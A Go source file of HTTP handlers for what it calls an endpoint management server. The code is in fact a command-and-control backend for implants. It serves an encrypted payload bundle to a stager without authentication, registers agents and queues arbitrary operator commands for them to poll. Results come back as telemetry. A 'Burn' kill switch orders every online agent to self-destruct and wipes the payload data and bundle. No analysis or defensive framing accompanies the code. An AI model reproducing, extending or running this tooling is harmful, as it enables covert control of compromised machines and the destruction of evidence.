package handlers

import (
	"encoding/json"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/redis/go-redis/v9"

	"endpoint-management-server/internal/auth"
	"endpoint-management-server/internal/middleware"
	"endpoint-management-server/internal/models"
	"endpoint-management-server/internal/queue"
	"endpoint-management-server/internal/repository"
)

type AgentHandler struct {
	agentRepo     *repository.AgentRepository
	taskRepo      *repository.TaskRepository
	telemetryRepo *repository.TelemetryRepository
	auditRepo     *repository.AuditRepository
	taskQueue     *queue.TaskQueue
	maxRetries    int
	bundlePath    string
	redisClient   *redis.Client
}

func NewAgentHandler(
	agentRepo *repository.AgentRepository,
	taskRepo *repository.TaskRepository,
	telemetryRepo *repository.TelemetryRepository,
	auditRepo *repository.AuditRepository,
	taskQueue *queue.TaskQueue,
	maxRetries int,
	bundlePath string,
	redisClient *redis.Client,
) *AgentHandler {
	return &AgentHandler{
		agentRepo:     agentRepo,
		taskRepo:      taskRepo,
		telemetryRepo: telemetryRepo,
		auditRepo:     auditRepo,
		taskQueue:     taskQueue,
		maxRetries:    maxRetries,
		bundlePath:    bundlePath,
		redisClient:   redisClient,
	}
}

// ServeBundle handles GET /api/v1/agent/bundle.
// Serves the pre-built encrypted bundle to the stager.
// Unauthenticated — stager calls this before registering.
func (h *AgentHandler) ServeBundle(c *gin.Context) {
	if h.bundlePath == "" {
		c.JSON(http.StatusNotFound, gin.H{"error": "bundle not configured"})
		return
	}
	data, err := os.ReadFile(h.bundlePath)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "bundle not available"})
		return
	}
	log.Printf("[JOCKY] bundle served to %s — %d bytes", c.ClientIP(), len(data))
	c.Data(http.StatusOK, "application/octet-stream", data)
}

// Register handles POST /api/v1/agent/register.
// Registers a new endpoint agent and returns a one-time bearer token.
func (h *AgentHandler) Register(c *gin.Context) {
	var req models.RegisterAgentRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	rawToken, err := auth.GenerateToken()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to generate token"})
		return
	}
	hashedToken := middleware.HashToken(rawToken)

	ctx := c.Request.Context()
	agent, err := h.agentRepo.Create(ctx, req.Hostname, req.IPAddress, hashedToken, req.Metadata)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to register agent"})
		return
	}

	_ = h.auditRepo.Write(ctx, "agent_register", "agent", &agent.AgentID, c.ClientIP(), map[string]interface{}{
		"hostname":   req.Hostname,
		"ip_address": req.IPAddress,
	})

	c.JSON(http.StatusCreated, models.RegisterAgentResponse{
		AgentID:   agent.AgentID,
		AuthToken: rawToken,
		ExpiresIn: 0,
	})
}

// Poll handles GET /api/v1/agent/poll.
// Invoked periodically by a registered agent to fetch queued tasks.
// For each task popped: increments retry_count, and if >= maxRetries marks
// the task failed without delivering it to the agent.
func (h *AgentHandler) Poll(c *gin.Context) {
	agentVal, _ := c.Get(middleware.AgentContextKey)
	agent := agentVal.(*models.Agent)

	ctx := c.Request.Context()

	locked, err := h.taskQueue.AcquirePollLock(ctx, agent.AgentID, 5*time.Second)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "poll lock failure"})
		return
	}
	if !locked {
		c.JSON(http.StatusTooManyRequests, gin.H{"error": "poll already in progress"})
		return
	}

	if err := h.agentRepo.UpdateLastSeen(ctx, agent.AgentID); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to update presence"})
		return
	}
	_ = h.taskQueue.SetPresence(ctx, agent.AgentID, 90*time.Second)

	queued, err := h.taskQueue.PopAll(ctx, agent.AgentID, 20)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to poll task queue"})
		return
	}

	tasks := make([]models.Task, 0, len(queued))
	for _, qt := range queued {
		retries, err := h.taskRepo.IncrementRetryCount(ctx, qt.TaskID)
		if err != nil {
			continue
		}

		if retries >= h.maxRetries {
			msg := "max retries reached"
			_ = h.taskRepo.MarkFailedFinal(ctx, qt.TaskID, msg)
			_ = h.auditRepo.Write(ctx, "task_max_retries", "task", &qt.TaskID, c.ClientIP(), map[string]interface{}{
				"agent_id":    agent.AgentID,
				"retry_count": retries,
				"max_retries": h.maxRetries,
			})
			continue
		}

		if err := h.taskRepo.MarkSent(ctx, qt.TaskID); err != nil {
			continue
		}
		tasks = append(tasks, models.Task{
			TaskID:      qt.TaskID,
			AgentID:     agent.AgentID,
			CommandType: qt.CommandType,
			Payload:     qt.Payload,
			Status:      "sent",
		})
	}

	c.JSON(http.StatusOK, models.PollResponse{
		Tasks:     tasks,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	})
}

// CreateTask is an operator-facing endpoint to enqueue a task for an agent.
// POST /api/v1/agent/:agent_id/tasks
func (h *AgentHandler) CreateTask(c *gin.Context) {
	agentID, err := uuid.Parse(c.Param("agent_id"))
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid agent_id"})
		return
	}

	var body struct {
		CommandType string                 `json:"command_type" binding:"required"`
		Payload     map[string]interface{} `json:"payload"`
	}
	if err := c.ShouldBindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	ctx := c.Request.Context()
	task, err := h.taskRepo.Create(ctx, agentID, body.CommandType, body.Payload)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	if err := h.taskQueue.Push(ctx, agentID, queue.QueuedTask{
		TaskID:      task.TaskID,
		CommandType: task.CommandType,
		Payload:     task.Payload,
	}); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to enqueue task"})
		return
	}

	_ = h.auditRepo.Write(ctx, "task_create", "task", &task.TaskID, c.ClientIP(), map[string]interface{}{
		"agent_id":     agentID,
		"command_type": body.CommandType,
	})

	c.JSON(http.StatusCreated, task)
}

// ListAgents handles GET /api/v1/operator/agents.
// Returns all registered agents, newest first. Requires operator JWT.
func (h *AgentHandler) ListAgents(c *gin.Context) {
	limit := 100
	if v := c.Query("limit"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 1000 {
			limit = n
		}
	}
	offset := 0
	if v := c.Query("offset"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n >= 0 {
			offset = n
		}
	}
	agents, err := h.agentRepo.List(c.Request.Context(), limit, offset)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to list agents"})
		return
	}
	if agents == nil {
		agents = []models.Agent{}
	}
	c.JSON(http.StatusOK, gin.H{"agents": agents, "count": len(agents)})
}

// ListTasks handles GET /api/v1/operator/tasks?agent_id=<uuid>&limit=50.
// Returns task history for a specific agent. Requires operator JWT.
func (h *AgentHandler) ListTasks(c *gin.Context) {
	agentID, err := uuid.Parse(c.Query("agent_id"))
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid or missing agent_id"})
		return
	}
	limit := 50
	if v := c.Query("limit"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 500 {
			limit = n
		}
	}
	tasks, err := h.taskRepo.ListByAgent(c.Request.Context(), agentID, limit)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to list tasks"})
		return
	}
	if tasks == nil {
		tasks = []models.Task{}
	}
	c.JSON(http.StatusOK, gin.H{"tasks": tasks, "count": len(tasks)})
}

// ListTelemetry handles GET /api/v1/operator/telemetry?agent_id=<uuid>&limit=50.
// Returns telemetry logs for a specific agent. Requires operator JWT.
func (h *AgentHandler) ListTelemetry(c *gin.Context) {
	agentID, err := uuid.Parse(c.Query("agent_id"))
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid or missing agent_id"})
		return
	}
	limit := 50
	if v := c.Query("limit"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 500 {
			limit = n
		}
	}
	logs, err := h.telemetryRepo.ListByAgent(c.Request.Context(), agentID, limit)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to list telemetry"})
		return
	}
	if logs == nil {
		logs = []models.Telemetry{}
	}
	c.JSON(http.StatusOK, gin.H{"telemetry": logs, "count": len(logs)})
}

// BundleUpload handles POST /api/v1/operator/bundle/upload.
// Accepts a multipart file named "bundle" and overwrites the bundle at bundlePath.
// Requires operator JWT.
func (h *AgentHandler) BundleUpload(c *gin.Context) {
	if h.bundlePath == "" {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "bundle path not configured"})
		return
	}
	fh, err := c.FormFile("bundle")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "bundle field required"})
		return
	}
	src, err := fh.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to open upload"})
		return
	}
	defer src.Close()

	data, err := io.ReadAll(src)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read upload"})
		return
	}

	// Ensure parent directory exists.
	if err := os.MkdirAll(filepath.Dir(h.bundlePath), 0700); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "cannot create bundle directory"})
		return
	}
	if err := os.WriteFile(h.bundlePath, data, 0600); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to write bundle"})
		return
	}

	log.Printf("[JOCKY] bundle updated by operator %s — %d bytes", c.ClientIP(), len(data))
	_ = h.auditRepo.Write(c.Request.Context(), "bundle_upload", "bundle", nil, c.ClientIP(),
		map[string]interface{}{"size": len(data)})
	c.JSON(http.StatusOK, gin.H{"size": len(data), "path": h.bundlePath})
}

// Burn handles POST /api/v1/operator/burn.
// Pushes self_destruct tasks to all online agents, flushes Redis payload data,
// and deletes the bundle file. The operator kill switch.
// Requires operator JWT.
func (h *AgentHandler) Burn(c *gin.Context) {
	ctx := c.Request.Context()

	// Push self_destruct to every online agent.
	agents, _ := h.agentRepo.List(ctx, 1000, 0)
	notified := 0
	for _, a := range agents {
		if a.Status == "online" {
			task, err := h.taskRepo.Create(ctx, a.AgentID, "self_destruct", nil)
			if err != nil {
				continue
			}
			_ = h.taskQueue.Push(ctx, a.AgentID, queue.QueuedTask{
				TaskID:      task.TaskID,
				CommandType: "self_destruct",
			})
			notified++
		}
	}

	// Flush Redis payload data: manifest + all chunk keys.
	h.redisClient.Del(ctx, "payload:manifest")
	iter := h.redisClient.Scan(ctx, 0, "payload:chunk:*", 0).Iterator()
	for iter.Next(ctx) {
		h.redisClient.Del(ctx, iter.Val())
	}

	// Delete bundle from disk.
	if h.bundlePath != "" {
		_ = os.Remove(h.bundlePath)
	}

	_ = h.auditRepo.Write(ctx, "operator_burn", "operator", nil, c.ClientIP(),
		map[string]interface{}{"agents_notified": notified})
	log.Printf("[JOCKY] BURN executed by %s — %d agent(s) notified", c.ClientIP(), notified)

	c.JSON(http.StatusOK, gin.H{"burned": true, "agents_notified": notified})
}

// Telemetry handles POST /api/v1/agent/telemetry.
// Receives JSON logs/metrics from an authenticated agent and persists them.
func (h *AgentHandler) Telemetry(c *gin.Context) {
	agentVal, _ := c.Get(middleware.AgentContextKey)
	agent := agentVal.(*models.Agent)

	var req models.TelemetryRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	validTypes := map[string]bool{"metrics": true, "event": true, "error": true, "heartbeat": true}
	if !validTypes[req.LogType] {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid log_type"})
		return
	}

	ctx := c.Request.Context()
	log, err := h.telemetryRepo.Create(ctx, agent.AgentID, req.TaskID, req.LogType, req.Data)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to persist telemetry"})
		return
	}

	if req.TaskID != nil {
		resultBytes, _ := json.Marshal(req.Data)
		_ = h.taskRepo.MarkExecuted(ctx, *req.TaskID, resultBytes)
	}

	c.JSON(http.StatusAccepted, gin.H{"log_id": log.LogID, "received_at": log.ReceivedAt})
}
